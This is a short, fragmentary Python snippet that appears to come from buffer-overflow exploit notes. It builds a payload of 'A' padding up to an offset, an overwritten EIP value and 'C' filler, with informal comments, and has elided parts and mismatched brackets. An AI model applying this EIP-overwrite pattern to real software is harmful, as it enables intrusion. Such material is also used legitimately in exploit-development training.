...
## set command, original lenght of ilteration and offset here ... the offset is before things gonna break
## set new_eip ... the thing, what comes after the break and which can be executed
...
payload = b"".join(
	...
	b"A" * offset,
	new_eip,
	b"C" * (lenght - len(new_eip) - offset), ## NEVER FORGET TO DECREASE THINGS TO COME BACK TO THE ORIG LENGHT
	]
)
